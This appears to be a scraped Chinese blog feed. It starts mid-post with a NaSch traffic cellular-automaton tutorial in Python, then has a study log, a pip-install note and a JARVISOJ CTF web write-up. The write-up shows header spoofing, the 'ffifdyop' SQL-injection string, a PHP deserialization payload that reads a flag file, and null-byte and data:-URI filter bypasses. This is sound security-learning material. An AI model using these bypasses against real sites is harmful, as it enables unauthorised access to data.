<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib <span class="keyword">as</span> mpl</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment"># 创建图像</span></span><br><span class="line">fig = plt.figure(figsize=(<span class="number">10</span>,<span class="number">1</span>))</span><br></pre></td></tr></table></figure>



<ul>
<li>设置模型的参数，相当于一个遥控器，哪里不对点哪里~</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 模型参数设置</span></span><br><span class="line">numofcell = <span class="number">20</span>     <span class="comment"># 道路长度</span></span><br><span class="line">numofcar = <span class="number">12</span>      <span class="comment"># 空间中的车辆数</span></span><br><span class="line">max_time = <span class="number">100</span>     <span class="comment"># 设置最大时间步</span></span><br><span class="line">max_speed = <span class="number">5</span>      <span class="comment"># 允许的车辆最大速度</span></span><br><span class="line">p_slowdown = <span class="number">0.3</span>   <span class="comment"># 随机慢化概率</span></span><br><span class="line">pause_time = <span class="number">0.1</span>   <span class="comment"># 刷新时间（每一帧持续的时间）</span></span><br><span class="line">cell_size = <span class="number">15</span>     <span class="comment"># 元胞的大小</span></span><br></pre></td></tr></table></figure>



<ul>
<li>定义一个函数来构建一维空间，空间的长度就是道路长度，相当于用一系列和X轴或Y轴平行的直线，绘制一排小网格，每个小网格的中心，相当于(i,0)，其中，i=1,2,…,numofcell</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 函数：构建一维空间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Plot_Space</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, numofcell): plt.plot([i<span class="number">-0.5</span>, i<span class="number">-0.5</span>], [<span class="number">-0.5</span>, <span class="number">0.5</span>], <span class="string">'-k'</span>, linewidth = <span class="number">0.5</span>)       </span><br><span class="line">    plt.axis([<span class="number">-0.5</span>, numofcell<span class="number">-0.5</span>, <span class="number">-0.5</span>, <span class="number">0.5</span>])</span><br><span class="line">plt.xticks([]);plt.yticks([])</span><br></pre></td></tr></table></figure>



<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-1d7a0167f9c813df44a37cd317f86592_hd.png"  alt="img">)<img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-1d7a0167f9c813df44a37cd317f86592_720w.png"  alt="img"></p>
<ul>
<li>定义一个函数来获取和前车的距离，从而避免两车相撞。在这里采用了周期性边界，即从道路末端驶出的小车会重新回到起点，相当于一个环路。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 函数：获取和前车的距离</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_empty_front</span><span class="params">(link, numofcell, indexofcell)</span>:</span></span><br><span class="line">    link2 = link * <span class="number">2</span>   <span class="comment"># 周期性边界</span></span><br><span class="line">    num = <span class="number">0</span>; i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (link2[indexofcell + i]) == <span class="literal">None</span>:</span><br><span class="line">        num += <span class="number">1</span>; i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br></pre></td></tr></table></figure>



<ul>
<li>在道路空间中随机生成numofcar个初始元胞，并赋予随机的初始速度（不大于已经设置好的最大速度）。道路被车辆占有的状态储存在列表link中，若元胞中没有车辆，则link对应的位置为“None”；若元胞中有车，link对应的位置储存车辆的速度。（可以开开脑洞，大胆地尝试不同初始状态噢）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 随机生成初始元胞</span></span><br><span class="line">Plot_Space()</span><br><span class="line">link = [<span class="literal">None</span>] * numofcell</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> num != numofcar:</span><br><span class="line">    sj = random.randint(<span class="number">0</span>, numofcell - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> link[sj] == <span class="literal">None</span>:</span><br><span class="line">        link[sj] = random.randint(<span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        num += <span class="number">1</span></span><br></pre></td></tr></table></figure>



<ul>
<li>在0~max_time的时间步内，进行NaSch模型的演化，模型演化的四个步骤：</li>
</ul>
<p><strong>加速：</strong>若还没到速度最大值，速度就加1</p>
<p><strong>减速：</strong>如果速度值大于前方的空元胞数，有撞车风险，则减速至前方的空元胞数目</p>
<p><strong>随机慢化：</strong>司机以p_slowdown的概率随机踩刹车，使速度减1</p>
<p><strong>位置更新：</strong>新的位置为当前位置+当前速度，同时更新所有车辆的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NaSch模型</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">0</span>, max_time):</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> range(<span class="number">0</span>, numofcell):</span><br><span class="line">        <span class="keyword">if</span> link[cell] != <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># 加速</span></span><br><span class="line">            link[cell] = min(link[cell] + <span class="number">1</span>, max_speed)</span><br><span class="line">            <span class="comment"># 减速</span></span><br><span class="line">            link[cell] = min(link[cell], get_empty_front(link, numofcell, cell))</span><br><span class="line">            <span class="comment"># 随机慢化</span></span><br><span class="line">            <span class="keyword">if</span> random.random() &lt;= p_slowdown:</span><br><span class="line">                link[cell] = max(link[cell] - <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 位置更新</span></span><br><span class="line">    nlink = [<span class="literal">None</span>] * numofcell</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> range(<span class="number">0</span>, numofcell):</span><br><span class="line">        <span class="keyword">if</span> link[cell] != <span class="literal">None</span>:</span><br><span class="line">            new_index = cell + link[cell]</span><br><span class="line">            <span class="keyword">if</span> new_index &gt;= numofcell:</span><br><span class="line">                new_index -= numofcell</span><br><span class="line">            nlink[new_index] = link[cell]</span><br><span class="line">    link = nlink</span><br></pre></td></tr></table></figure>



<ul>
<li>绘制当前时间步车辆位置的图像，注意这里有缩进，说明上一段NaSch模型演化代码中的for循环还没有结束呦~</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(link)):</span><br><span class="line">        <span class="keyword">if</span> link[i] != <span class="literal">None</span>:</span><br><span class="line">            x1.append(i)</span><br><span class="line">    Plot_Space()</span><br><span class="line">    plt.plot(x1, [<span class="number">0</span>] * numofcar, <span class="string">'sk'</span>, markersize=cell_size)</span><br><span class="line">    plt.xlabel(<span class="string">'timestep:'</span> + str(t))</span><br></pre></td></tr></table></figure>



<ul>
<li>让图片动起来（<strong>同样注意缩进</strong>），plt.pause()函数让当前的图像维持pause_time长的时间，随后plt.cla()函数将整个图像擦除。下一个时间步，继续绘制图像，保留一段时间，并擦除，再绘制图像……就能源源不断地产生动画啦！你学会了吗？</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.pause(pause_time)</span><br><span class="line">plt.cla()</span><br></pre></td></tr></table></figure>



<p><strong>终于写完代码啦，RUN一下！</strong></p>
<p>仔细看，拥堵带也会跳鬼步舞，逐渐向后传播的。</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-3b6878489f851d07be894b5fb569886d_hd.gif"  alt="v2-3b6878489f851d07be894b5fb569886d_hd"></p>
<p>操控我的“遥控器”，给它一个初始状态，就可以开启“阅兵模式”啦，你猜我是怎么做到的？</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-c6155fd05a1d22975edbb7f376ee213a_hd.gif"  alt="img"></p>
<p>给我开“瞬移”挂，只要动的足够快，你就分不清我到底是往左跑还是往右跑</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-3b6878489f851d07be894b5fb569886d_hd-1594375389654.gif"  alt="v2-3b6878489f851d07be894b5fb569886d_hd"></p>
<hr>
<blockquote>
<p>内容参考<a href="http://wulixb.iphy.ac.cn/fileWLXB/journal/article/wlxb/2001/3/PDF/w20010315.pdf" target="_blank" rel="noopener">http://wulixb.iphy.ac.cn/fileWLXB/journal/article/wlxb/2001/3/PDF/w20010315.pdf</a></p>
</blockquote>
<p>如果说上车到出发需要一个时间单位</p>
<table>
<thead>
<tr>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5(乘车点)</th>
<th>6</th>
</tr>
</thead>
<tbody><tr>
<td>o</td>
<td></td>
<td>o</td>
<td>o</td>
<td>o</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>建模</category>
      </categories>
      <tags>
        <tag>建模</tag>
        <tag>元胞自动机</tag>
      </tags>
  </entry>
  <entry>
    <title>php/进展</title>
    <url>/2020/06/19/php/%E8%BF%9B%E5%B1%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>2020/6/5 本周进展</p>
<p>php学习完了基本语法和流程控制结构</p>
<p>现在正在看函数，完成了php计算器和while循环输出表格的复现</p>
<p>大致过了一下漏测课上讲的http内容</p>
<p>这周一直在忙数学作业和国创项目答辩，学的不是很多，周末补上</p>
<p>2020/6/12</p>
<p>php看完了函数，php匿名函数和闭包还需要再看看</p>
<p>漏洞利用与渗透测试课做了反序列化攻击、sql注入、跨站脚本攻击实验，并写了实验报告<br>这个学期的课程都上完了，总结了以下漏测课这个学期做的实验<a href="https://michelle19l.gitee.io/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/" target="_blank" rel="noopener">https://michelle19l.gitee.io/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/</a><br>数据库课程完成了大作业，flask+mysql数据库管理系统</p>
<p>2020/6/19</p>
<p>本周看了sql注入的前两章，现在正在看第三章</p>
<p>对着题解写了五个jarvisoj的web题，总结了解题过程和知识点</p>
]]></content>
  </entry>
  <entry>
    <title>kali pip安装</title>
    <url>/2020/06/17/pip%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>wget <a href="https://bootstrap.pypa.io/get-pip.py" target="_blank" rel="noopener">https://bootstrap.pypa.io/get-pip.py</a></p>
<p>python3 get-pip.py</p>
<p>添加环境变量</p>
<p>vim /etc/profile,添加warning中的内容，如果没有则掠过</p>
<p>pip -V测试安装是否成功</p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>JARVISOJ WEB题目学习</title>
    <url>/2020/06/16/jarvisoj/jarvisoj_web/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h1><blockquote>
<p>题目链接：<a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">http://web.jarvisoj.com:32774/</a></p>
<p>参考题解：<a href="https://blog.csdn.net/weixin_44077544/article/details/89407287" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44077544/article/details/89407287</a></p>
</blockquote>
<p>打开之后显示<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616170910514.png"  alt="image-20200616170910514"></p>
<div class="note info">
            <p>curl命令：</p><p>curl <a href="http://xxxxxx" target="_blank" rel="noopener">http://xxxxxx</a></p><p>返回该网页的html</p><p>–local-port<NUM>              强制使用本地端口号</NUM></p>
          </div>

<p>输入</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl --<span class="built_in">local</span>-port 51 http://web.jarvisoj.com:32770/</span><br></pre></td></tr></table></figure>

<p>返回</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616172140435.png"  alt="image-20200616172140435"></p>
<h1 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h1><blockquote>
<p>题目链接：<a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">http://web.jarvisoj.com:32774/</a></p>
<p>参考题解：<a href="https://www.cnblogs.com/IMBlackMs/p/11272848.html" target="_blank" rel="noopener">https://www.cnblogs.com/IMBlackMs/p/11272848.html</a></p>
</blockquote>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616172347717.png"  alt="image-20200616172347717"></p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>只允许本机登录</p>
<p>考虑添加header:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ｘ-Forward-For          127.0.0.1</span><br></pre></td></tr></table></figure>

<p>来构造一个<font color="red">“原始客户端为localhost”的报文</font>，达到access的目的</p>
<h2 id="设置代理、抓包"><a href="#设置代理、抓包" class="headerlink" title="设置代理、抓包"></a>设置代理、抓包</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616173838544.png"  alt="image-20200616173838544"></p>
<p>打开burpsuite，勾选127.0.0.1:8080</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616173916784.png"  alt="image-20200616173916784" style="zoom: 80%;">

<p>调整至intercept is on，进行抓包</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616174010129.png"  alt="image-20200616174010129"></p>
<p>添加header，点击forward发送</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616174246689.png"  alt="image-20200616174246689"></p>
<p>得到flag</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616174309897.png"  alt="image-20200616174309897"></p>
<h1 id="LOGIN"><a href="#LOGIN" class="headerlink" title="LOGIN"></a>LOGIN</h1><ul>
<li>burpsuite</li>
<li>md5</li>
</ul>
<p>打开proxy-options-intercept server responses</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616175942620.png"  alt="image-20200616175942620" style="zoom:80%;">

<p>看到hint</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hint: &quot;select * from &#96;admin&#96; where password&#x3D;&#39;&quot;.md5($pass,true).&quot;&#39;&quot;</span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616175832244.png"  alt="image-20200616175832244" style="zoom:200%;">



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>;;) &#123; </span><br><span class="line"> <span class="keyword">for</span> ($c = <span class="number">0</span>; $c &lt; <span class="number">1000000</span>; $c++, $i++)</span><br><span class="line">  <span class="keyword">if</span> (stripos(md5($i, <span class="keyword">true</span>), <span class="string">'\'or\''</span>) !== <span class="keyword">false</span>)</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"\nmd5($i) = "</span> . md5($i, <span class="keyword">true</span>) . <span class="string">"\n"</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>（这个代码我没有跑出来，TLE了）</p>
<p>ffifdyop</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616204517605.png"  alt="image-20200616204517605" style="zoom:67%;">

<h1 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h1><ul>
<li>文件包含漏洞</li>
<li>序列化</li>
</ul>
<blockquote>
<p>题目链接：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a></p>
<p>参考题解：<a href="https://blog.csdn.net/qq1045553189/article/details/87562204?utm_medium=distribute.pc_relevant.none-task-blog-baidujs-1" target="_blank" rel="noopener">https://blog.csdn.net/qq1045553189/article/details/87562204?utm_medium=distribute.pc_relevant.none-task-blog-baidujs-1</a></p>
</blockquote>
<p>打开后是一张图片</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200617115013351.png"  alt="image-20200617115013351" style="zoom: 33%;">

<p>查看网页源代码，发现showing.php,和一张base64编码的img，解密后是shield.jpg</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200617115034966.png"  alt="image-20200617115034966" style="zoom:67%;">

<p>点进去，发现是图片编码</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200617115053325.png"  alt="image-20200617115053325"></p>
<p>判断是文件包含漏洞</p>
<p>尝试读取showimg.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;web.jarvisoj.com:32768&#x2F;showimg.php?img&#x3D;c2hvd2ltZy5waHA&#x3D;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">		$f = base64_decode($f);</span><br><span class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">		&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><font color="green">stripos查找字符串首次出现的位置（不区分大小写）</font></p>
<p><font color="green">代码中过滤掉了..   /   \\(切换目录的字符)   和pctf</font></p>
<p>尝试获取index.php(aW5kZXgucGhw)</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200617140304865.png"  alt="image-20200617140304865"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;web.jarvisoj.com:32768&#x2F;showimg.php?img&#x3D;aW5kZXgucGhw</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);\\反序列化</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;img src=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> width=<span class="string">"100%"</span>/&gt;</span><br></pre></td></tr></table></figure>

<p><font color="green">使用GET传参，参数名‘class’</font></p>
<p>读shield.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32768&#x2F;showimg.php?img&#x3D;c2hpZWxkLnBocA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//flag is in pctf.php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $file;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">			&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>showimg.php对pctf进行了过滤，但是readfile()没有</p>
<p>编写php脚本，得到序列化后的shield实例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//flag is in pctf.php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $file;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">			&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $x=<span class="keyword">new</span> Shield (<span class="string">"pctf.php"</span>);</span><br><span class="line">  <span class="keyword">echo</span> serialize($x);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到序列化结果<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200617140000130.png"  alt="image-20200617140000130"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32768&#x2F;index.php?class&#x3D;O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200617140456082.png"  alt="image-20200617140456082"></p>
<h1 id="IN-A-MESS"><a href="#IN-A-MESS" class="headerlink" title="IN A MESS"></a>IN A MESS</h1><blockquote>
<p>题目链接：<a href="http://web.jarvisoj.com:32780/" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/</a></p>
<p>题解链接：<a href="https://blog.csdn.net/wyj_1216/article/details/82954242" target="_blank" rel="noopener">https://blog.csdn.net/wyj_1216/article/details/82954242</a></p>
</blockquote>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618153328981.png"  alt="image-20200618153328981"></p>
<p>查看源码<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618153358706.png"  alt="image-20200618153358706"></p>
<p>查看index.phps</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618153449177.png"  alt="image-20200618153449177"></p>
<blockquote>
<p>转载自：<a href="https://www.jianshu.com/p/cb124701a5d8" target="_blank" rel="noopener">https://www.jianshu.com/p/cb124701a5d8</a></p>
<p>1.<code>stripos(字符串a，字符串b)函数</code>查找字符串b在字符串a中第一次出现的位置（不区分大小写）<br>2.<code>file_get_contents</code> 将整个文件读入一个字符串<br>3.<code>eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;)</code> 判断”1114”这个字符串里面是否有符合”111”.substr($b,0,1)这个规则的</p>
<p>注，php5.3以后不支持eregi</p>
</blockquote>
<table>
<thead>
<tr>
<th>参数</th>
<th>要求</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>id==0</td>
<td>前面有非零的判断，所以用0e或‘0’绕过</td>
</tr>
<tr>
<td>b</td>
<td>strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4</td>
<td>这里要求：b的长度大于5，且是基于eregi函数的弱类型，用%00的绕过（ strlen函数对%00不截断但substr截断）那么可以令<code>b=%00411111</code></td>
</tr>
<tr>
<td>a</td>
<td>由data进行赋值：<code>$data = @file_get_contents($a,&#39;r&#39;)</code> 而又有<code>$data==&quot;1112 is a nice lab!&quot;</code></td>
<td>可以利用远程文件包含在<code>allow_url_include</code>开启时可以使用，但发现对<code>$a</code>有了<code>.</code>过滤所以还是data协议比较稳妥</td>
</tr>
</tbody></table>
<blockquote>
<p>data类型的URL格式：<a href="https://blog.csdn.net/lxgwm2008/article/details/38437875" target="_blank" rel="noopener">https://blog.csdn.net/lxgwm2008/article/details/38437875</a></p>
<p>对于一些小数据，可以在网页中直接嵌入，而不是从外部文件载入，减少服务器负载</p>
<p>例如直接在浏览器输入data:text/html,<html><body><p><b>Hello, world!</b></p></body></html></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618155848440.png"  alt="image-20200618155848440"></p>
<p>或者运行</p>
<p>（Url是一种基于文本的协议，所以gif/png/jpeg这种二进制属于需要用base64进行编码。换句话说，引入base64以后，就可以支持任意形式的数据格式。）</p>
